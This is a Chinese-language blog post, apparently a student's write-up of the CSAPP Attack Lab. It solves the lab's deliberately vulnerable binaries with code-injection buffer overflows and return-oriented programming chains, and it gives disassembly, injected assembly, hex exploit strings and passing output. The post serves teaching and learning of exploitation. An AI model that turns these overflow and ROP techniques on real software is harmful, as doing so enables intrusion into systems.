<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="Gridea静态个人博客">
<meta name="description" content="独语斜阑">
<meta name="theme-color" content="#000">
<title>CSAPP: Attacklab | 语阑gz</title>
<link rel="shortcut icon" href="/favicon.ico?v=1628411867976">
<link rel="stylesheet" href="/media/css/gemini.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">


<link href="/media/hljs/styles/default.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script src="/media/js/jquery.js"></script>
<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>






  <meta name="description" content="CSAPP: Attacklab" />
  <meta name="keywords" content="CSAPP" />
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="gemini">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>语阑gz</span>
            </a>  
          
        </div>
        
          <p class="subtitle">独语斜阑</p>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-home"></i> 首页
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/archives/" target="_self">
                  <i class="fa fa-archive"></i> 归档
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/tags/" target="_self">
                  <i class="fa fa-tags"></i> 标签
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/post/about/" target="_self">
                  <i class="fa fa-user"></i> 关于
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> 友情链接
                  
                </a>
              </li>
            
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">搜索</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout gemini ">
      <div class="section-layout-wrapper">
        

<div class="sidebar">
  
    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
      
        <div class="post-list-sidebar">
          <div class="sidebar-title">
            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active language" data-lan="index">文章目录</span>
            <span id="metaSideBar" class="sidebar-title-item language" data-lan="preview">站点概览</span>
          </div>
        </div>
      
      <div class="sidebar-body gemini" id="sidebar_body">
        
          
            <div class="post-side-meta" id="post_side_meta">
              
<div class="sidebar-wrapper box-shadow-wrapper bg-color">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">语阑gz</p>
    
    <div class="site-description right-motion">
      
      
      
        <p>独语斜阑</p>
      
      
    </div>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">27</span>
        <span class="site-item-stat-name language" data-lan="article">文章</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="">
        <span class="site-item-stat-count">10</span>
        <span class="site-item-stat-name language" data-lan="category">分类</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">10</span>
        <span class="site-item-stat-name language" data-lan="tag">标签</span>
      </a>
    </div>
  </div>
  
    
  
  
    <div class="sidebar-item sidebar-item-social">
      <div class="social-item">
        
          
            <a href="https://github.com/yulangz">
              <i class="fa fa-github" title="github"></i>
            </a>
          
            <a href="mailto:1301481108@qq.com">
              <i class="fa fa-envelope-o" title="邮箱"></i>
            </a>
          
        
        
          
            <a class="social-img" href="#">
              <img src="" />
              <i class="fa fa-globe" title="" ></i>
            </a>
          
        
      </div>
    </div>
  



</div>
            </div>
            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
              <div class="toc-box right-motion">
  <div class="toc-wrapper auto-number auto"
    id="toc_wrapper">
    <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#level1">Level1</a>
<ul>
<li><a href="#%E6%9F%A5%E7%9C%8Btouch1%E7%9A%84%E5%9C%B0%E5%9D%80">查看touch1的地址</a></li>
<li><a href="#%E6%9E%84%E9%80%A0%E6%88%91%E4%BB%AC%E7%9A%84%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2">构造我们的输入字符串</a></li>
<li><a href="#%E9%80%9A%E8%BF%87hex2raw%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B9%B6%E6%89%A7%E8%A1%8C">通过hex2raw生成攻击字符串并执行</a></li>
</ul>
</li>
<li><a href="#level2">Level2</a>
<ul>
<li><a href="#%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E6%8F%92%E5%85%A5%E7%9A%84%E4%BB%A3%E7%A0%81">我们需要插入的代码</a>
<ul>
<li><a href="#%E9%80%9A%E8%BF%87gdb%E6%9F%A5%E7%9C%8Brep%E7%9A%84%E5%80%BC">通过gdb查看%rep的值</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#level3">Level3</a><br>
*
<ul>
<li><a href="#%E7%94%9F%E6%88%90%E6%9C%BA%E5%99%A8%E7%A0%81">生成机器码</a></li>
<li><a href="#%E6%9C%80%E7%BB%88%E5%86%99%E5%87%BA%E5%85%A5%E4%BE%B5%E5%AD%97%E4%B8%B2">最终写出入侵字串</a></li>
<li><a href="#%E9%80%9A%E8%BF%87">通过！！！</a></li>
</ul>
</li>
<li><a href="#rtarget">rtarget</a>
<ul>
<li><a href="#1">1</a></li>
<li><a href="#2">2</a></li>
</ul>
</li>
</ul>
</li>
</ul>

  </div>
</div>

<script>

  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
  let active = 'active-show', activeClass = 'active-current';
  let tocWrapper = document.querySelector('#toc_wrapper');
  let tocContent = tocWrapper.children[0];
  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');

  function addTocNumber(elem, deep) {
    if (!elem) {
      return;
    }
    let prop = elem.__proto__;

    if (prop === HTMLUListElement.prototype) {
      for (let i = 0; i < elem.children.length; i++) {
        addTocNumber(elem.children[i], deep + (i + 1) + '.');
      }
    } else if (prop === HTMLLIElement.prototype) {
      // 保存li元素
      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
        lList.push(elem);
      }
      for (let i = 0; i < elem.children.length; i++) {
        let cur = elem.children[i];
        if (cur.__proto__ === HTMLAnchorElement.prototype) {
          if (autoNumber) {
            cur.text = deep + ' ' + cur.text;
          }
        } else if (cur.__proto__ === HTMLUListElement.prototype) {
          addTocNumber(cur, deep);
        }
      }
    }
  }

  function removeParentActiveClass() {
    let parents = tocContent.querySelectorAll('.' + active)
    parents.forEach(function (elem) {
      elem.classList.remove(active);
    });
  }

  function addActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.add(activeClass);
    }
  }

  function removeActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.remove(activeClass);
    }
  }

  function addActiveLiElemment(elem, parent) {
    if (!elem || elem === parent) {
      return;
    } else {
      if (elem.__proto__ === HTMLLIElement.prototype) {
        elem.classList.add(active);
      }
      addActiveLiElemment(elem.parentElement, parent);
    }
  }

  function showToc() {
    if (tocWrapper) {
      postBody = document.querySelector('#post_body');
      for (let i = 0; i < postBody.children.length; i++) {
        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
          hList.push(postBody.children[i]);
        }
      }
      if (tocWrapper.classList.contains('compress')) {
        tocContent.classList.add('closed');
      } else if (tocWrapper.classList.contains('no_compress')) {
        tocContent.classList.add('expanded');
      } else {
        if (hList.length > 10) {
          active = 'active-hidden'
          tocContent.classList.add('closed');
        } else {
          tocContent.classList.add('expanded');
        }
      }
    }
  }

  (function () {
    // 处理不是从#一级标题开始目录
    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
      let con = tocContent.children[0].children[0];
      tocContent.innerHTML = con.innerHTML;
    }
    let markdownItTOC = document.querySelector('.markdownIt-TOC');
    let innerHeight = window.innerHeight;
    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
    addTocNumber(tocContent, '');
  })();

  document.addEventListener('scroll', function (e) {
    if (lList.length <= 0) {
      return;
    }
    let scrollTop = document.scrollingElement.scrollTop + 10;
    let dir;

    if (lastTop - scrollTop > 0) {
      dir = 'up';
    } else {
      dir = 'down';
    }

    lastTop = scrollTop;
    if (scrollTop <= 0) {
      if (lastIndex >= 0 && lastIndex < hList.length) {
        lList[lastIndex].classList.remove(activeClass);
      }
      return;
    }

    let current = 0, hasFind = false;
    for (let i = 0; i < hList.length; i++) {
      if (hList[i].offsetTop > scrollTop) {
        current = i;
        hasFind = true;
        break;
      }
    }
    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
      current = hList.length - 1;
    } else {
      current--;
    }
    if (dir === 'down') {
      if (current > lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex)
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    } else {
      if (current < lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex);
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    }
  });


  window.addEventListener('load', function () {
    showToc();
    document.querySelector('#sidebar').style = 'display: block;';
    tocWrapper.classList.add('toc-active');
    setTimeout(function () {
      if ("createEvent" in document) {
        let evt = document.createEvent("HTMLEvents");
        evt.initEvent("scroll", false, true);
        document.dispatchEvent(evt);
      }
      else {
        document.fireEvent("scroll");
      }
    }, 500)
  })

</script>
            </div>
          
        
      </div>
    </div>
  
</div>
<script>
  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
  const SLIDE_UP_IN = 'slide-up-in';

  let sidebar = document.querySelector('#sidebar'),
  tocSideBar = document.querySelector('#tocSideBar'),
  metaSideBar = document.querySelector('#metaSideBar'),
  postToc = document.querySelector('#post_toc'),
  postSiteMeta = document.querySelector('#post_side_meta'),
  sidebarTitle = document.querySelector('.sidebar-title'),
  sidebarBody = document.querySelector('#sidebar_body');

  tocSideBar && tocSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  metaSideBar && metaSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  function toggleSidebar(e) {
    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
    if (currentTitle == e.srcElement) {
      return ;
    }
    let current, showElement, hideElement;
    if (e.srcElement == metaSideBar) {
      showElement = postSiteMeta;
      hideElement = postToc;
    } else if (e.srcElement == tocSideBar){
      showElement = postToc;
      hideElement = postSiteMeta;
    }
    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);

    jQuery.Velocity(hideElement, 'stop');
    jQuery.Velocity(hideElement, 'transition.slideUpOut', {
      display: 'none',
      duration: 200,
      complete: function () {
        jQuery.Velocity(showElement, 'transition.slideDownIn', {
          duration: 200
        });
      }
    })
    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
  }

  postToc && postToc.addEventListener('transitionend', function() {
    this.classList.remove(SLIDE_UP_IN);
  });

  if (sidebarBody) {
    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
      let hasFix = false;
      let scrollEl = document.querySelector('.main-continer');
      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
      window.addEventListener('scroll', function(e) {
        if (document.scrollingElement.scrollTop >= limitTop) {
          if (!hasFix) {
            sidebar.classList.add('sidebar-fixed');
            hasFix = true;
          }
        } else {
          if (hasFix) {
            sidebar.classList.remove('sidebar-fixed');
            hasFix = false;
          }
        }
      });
    }
  }
  
</script>
        <div class="section-box box-shadow-wrapper">
          <div class="section bg-color post post-page">
            <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://yulan.net.cn/post/uscxh7_ainkg2/">
      CSAPP: Attacklab
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">发布于</span>
      <span class="publish-time" data-t="2021-08-06 13:35:26">2021-08-06</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">分类于</span>
      
      
      <a href="https://yulan.net.cn/tag/Gr1xnj72j/">
        <span>CSAPP</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>11<span class="language" data-lan="minute">分钟</span></span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>2144<span class="pc-show language" data-lan="words">字数</span></span>
    </span>
    
  </div>
</section>
            <div class="post-body next-md-body" id="post_body">
              <p>这个实验要求在5个有不同安全漏洞的代码上进行攻击(一开始我还以为是要修复漏洞...)，总共有两种攻击方式：</p>
<ul>
<li>Code Injection Attacks（缓冲区溢出攻击）</li>
<li>Return-Oriented Programming（ROP攻击）</li>
</ul>
<p>从CSAPP网站下载下来解压后一共有五个文件：</p>
<ul>
<li><code>ctarget</code>：一个容易遭受code injection攻击的可执行程序。</li>
<li><code>rtarget</code>：一个容易遭受return-oriented programming攻击的可执行程序。</li>
<li><code>cookie.txt</code>：一个8位的十六进制码，用于验证身份的唯一标识符。</li>
<li><code>farm.c</code>：目标“gadget farm”的源代码，用于产生return-oriented programming攻击。</li>
<li><code>hex2raw</code>：一个生成攻击字符串的工具。</li>
</ul>
<p>实验之前一定要阅读<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">指导手册</a>，还有<a href="http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf">GDB指南</a>，对实验很有帮助。</p>
<h2 id="level1">Level1</h2>
<p>要求我们输入一段字符串，通过缓冲区溢出改变函数的返回地址，定向到 <code>touch1</code> 函数<br>
首先看看 <code>test</code> 函数：</p>
<pre><code>0000000000401968 &lt;test&gt;:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt;
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq
</code></pre>
<p>没有什么特别之处<br>
我们再看下 <code>getbuf</code> 函数：</p>
<pre><code>00000000004017a8 &lt;getbuf&gt;:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
</code></pre>
<p>首先创建一个 40 个字节的缓冲区( <code>0x28=40</code> )，然后通过Gets函数读取一个字符串到缓冲区。<br>
我们先来查看一下stack的状态：</p>
<pre><code>(gdb) x/60b $rsp
0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00
</code></pre>
<p>可以看到距离 <code>%rsp</code> 的第41,42,43字节处有一个值 <code>761940</code> ，猜测这是一个返回地址，Ctrl+F查找<br>
然而<br>
<img src="http://static.yulan.net.cn/image/_0da3636d63a59ddbf940c5191d99cf0e.png" alt="" loading="lazy"><br>
忽然想起小端序的问题，所以这个地址应该是 <code>401976</code><br>
<img src="http://static.yulan.net.cn/image/_65725cc8a986fa6dbca8525ef2087c08.png" alt="" loading="lazy"><br>
就是getbuf函数后一条指令的位置。<br>
所以我们只需要通过缓冲区溢出来改变这个指令地址即可。</p>
<h3 id="查看touch1的地址">查看touch1的地址</h3>
<pre><code>00000000004017c0 &lt;touch1&gt;:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
</code></pre>
<h3 id="构造我们的输入字符串">构造我们的输入字符串</h3>
<pre><code>11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 c0 17 40
</code></pre>
<p>前40位不重要</p>
<h3 id="通过hex2raw生成攻击字符串并执行">通过hex2raw生成攻击字符串并执行</h3>
<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./hex2raw &lt; exploit1.txt &gt; exploit1-raw.txt
ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit1-raw.txt 
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40
</code></pre>
<p>通过！！！</p>
<h2 id="level2">Level2</h2>
<p>这一关要我们从test跳转到另外一个函数 <code>touch2</code> ，同时将我们自己的cookie作为参数传给 <code>touch2</code> ，这个参数默认应该在%rdi中。<br>
这一关我们不仅要修改跳转地址，还要插入一段代码进去执行，我们可以把这段代码插在缓冲区之中，然后将返回地址修改为我们代码的地址，并我们的代码中加入ret指令，使他最后返回到 <code>touch2</code> 的入口</p>
<h3 id="我们需要插入的代码">我们需要插入的代码</h3>
<pre><code>mov $0x59b997fa,%rdi
pushq $0x4017ec
retq
</code></pre>
<p>很简单，只用将cookie保存到%rdi，然后重新指定 <code>touch2</code> 的地址为返回地址即可<br>
使用gcc与objdump生成机器指令</p>
<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ gcc -c asscode.s
ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o

asscode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
</code></pre>
<p>把指令插在缓冲区</p>
<pre><code>48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  78 dc 61 55
</code></pre>
<p>和level1一样，前面40个字节，后面是我们指定的返回地址，这里我们要将他指定为我们的代码插入的位置，也就是缓存区的起始地址。</p>
<h4 id="通过gdb查看rep的值">通过gdb查看%rep的值</h4>
<pre><code>(gdb) print $rsp
$2 = (void *) 0x5561dc78
</code></pre>
<p>所以最后四个字节应该是 <code>78</code> <code>dc</code> <code>61</code> <code>55</code><br>
最后和level1一样执行</p>
<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit2-raw.txt 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
</code></pre>
<h2 id="level3">Level3</h2>
<p>这一关和level2差不多，只是这次传的参数是一个指针，其实差不多，我们先把cookie存在栈里面，然后把地址传给%rdi即可。<br>
<img src="http://static.yulan.net.cn/image/_d13d42c5c8d72192ca39358968839d97.png" alt="" loading="lazy"><br>
要注意函数hexmatch会使用栈上的空间，可能会覆盖我们的cookie<br>
<strong>不过没关系，</strong><code>**sub 0x28 %rsp**</code>**  ，咱给自己造个栈**<br>
所以我们嵌入的代码应该是</p>
<pre><code>movq $0x5561dc93,%rdi
sub $0x28,%rsp
pushq $0x4018fa
retq
</code></pre>
<p>其中第一步传给%rdi的地址应该是你存放cookie的地址，一定要数清楚，我们还要把cookie使用ascii码转义，并在末尾添加 <code>0x00</code> 表示结束。</p>
<h4 id="生成机器码">生成机器码</h4>
<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o

asscode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   48 c7 c7 93 dc 61 55    mov    $0x5561dc93,%rdi
   7:   48 83 ec 28             sub    $0x28,%rsp
   b:   68 fa 18 40 00          pushq  $0x4018fa
  10:   c3                      retq
</code></pre>
<h3 id="最终写出入侵字串">最终写出入侵字串</h3>
<pre><code>48 c7 c7 93 dc 61 55 48 83 ec 28 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00  78 dc 61 55
</code></pre>
<h3 id="通过">通过！！！</h3>
<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit3-raw.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3(&quot;59b997fa&quot;)
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 93 DC 61 55 48 83 EC 28 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 78 DC 61 55
</code></pre>
<h2 id="rtarget">rtarget</h2>
<h3 id="1">1</h3>
<p>rtarget要求我们进行ROP攻击，因为栈随机化，所以我们不能像之前一样指定地址，只能依靠代码中原有的gadget进行入侵。<br>
我的想法是先把cookie pop到某个寄存器中，然后再mov到rdi里面。<br>
参考了实验手册，检索了fram部分的代码后发现只有 <code>58</code> 可以使用，也就是 <code>popq %rax</code> <br>
<img src="http://static.yulan.net.cn/image/_74f7a02a83c7342936036627bf6b81df.png" alt="" loading="lazy"><br>
然后寻找到一段 <code>movq %rax,%rdi</code> 的指令。<br>
<img src="http://static.yulan.net.cn/image/_519414af020393b2e70643e9fd7c701e.png" alt="" loading="lazy"><br>
这两个就是我们使用的gagget，地址分别是 <code>0x4019ab</code> 和· <code>0x4019a2</code>。<br>
将他们连续执行就会是如下情形：</p>
<pre><code>popq %rax
nop
ret
movq %rax,%rdi
ret
</code></pre>
<p>我们只用准备好pop出的数据和返回位置即可。<br>
这里要注意栈是向高字节收缩，所以我们需要把我们的插入片段放在40字节缓冲区后面。<br>
应该插入的代码如下</p>
<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ec 17 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
</code></pre>
<p>前40个字节没有实际意义，后面指定返回地址与准备pop出的数据</p>
<h3 id="2">2</h3>
<p>有些复杂，直接贴出来了</p>
<pre><code>35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00            06 1a 40 00 00 00 00 00            /* mov %rsp,%rax */
a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */

ab 19 40 00 00 00 00 00            /* pop %rax */
48 00 00 00 00 00 00 00

dd 19 40 00 00 00 00 00            /* mov %eax,%edx */
70 1a 40 00 00 00 00 00            /* mov %edx,%ecx */
13 1a 40 00 00 00 00 00            /* mov %ecx,%esi */
d6 19 40 00 00 00 00 00            /* lea (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61            /* cookie string */
00 00 00 00 00 00 00 00
</code></pre>

            </div>
            
            
              <div class="post-footer">
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong class="language" data-lan="author">本文作者：</strong>
      语阑gz
    </li>
    <li class="post-copyright-link">
      <strong class="language" data-lan="link">本文链接：</strong>
      <a href="https://yulan.net.cn/post/uscxh7_ainkg2/" title="CSAPP: Attacklab">https://yulan.net.cn/post/uscxh7_ainkg2/</a>
    </li>
    <li class="post-copyright-license">
      <strong class="language" data-lan="copyright">版权声明： </strong>
      本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> 许可协议。转载请注明出处！
    </li>
  </ul>
  <div class="tags">
    
      <a href="https://yulan.net.cn/tag/Gr1xnj72j/"># CSAPP</a>
    
  </div>
  <div class="nav">
    <div class="nav-prev">
      
        <i class="fa fa-chevron-left"></i>
        <a class="nav-pc-next" title="CSAPP: cachelab" href="https://yulan.net.cn/post/uscxh7_mezrog/">CSAPP: cachelab</a class="nav-pc-next">
        <a class="nav-mobile-prev" title="CSAPP: cachelab" href="https://yulan.net.cn/post/uscxh7_mezrog/">上一篇</a>
      
    </div>
    <div class="nav-next">
      
        <a class="nav-pc-next" title="CSAPP: Bomblab" href="https://yulan.net.cn/post/uscxh7_qulnpm/">CSAPP: Bomblab</a>
        <a class="nav-mobile-next" title="CSAPP: Bomblab" href="https://yulan.net.cn/post/uscxh7_qulnpm/">下一篇</a>
        <i class="fa fa-chevron-right"></i>
      
    </div>
  </div>
</div>
            
            
  

          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <span id="busuanzi_container_site_pv">浏览数 <span id="busuanzi_value_site_pv"></span> 次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">访客数 <span id="busuanzi_value_site_uv"></span> 人</span>
    <div class="copyright">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> ©2019 | Theme By <a
        href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
    </div>
    <div class="poweredby">
      <div style="width:600px;margin:0 0; padding:0 0;">
    <a target="_blank" href="http://beian.miit.gov.cn" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
        <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 0px;">鄂ICP备20002184号</p>
    </a>
    <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42010502001237" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
        <img src="/images/beian.png" style="float:left;" />
        <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 0px;">鄂公网安备 42010502001237号</p>
    </a>
</div>
    </div>
  </footer>
  
  
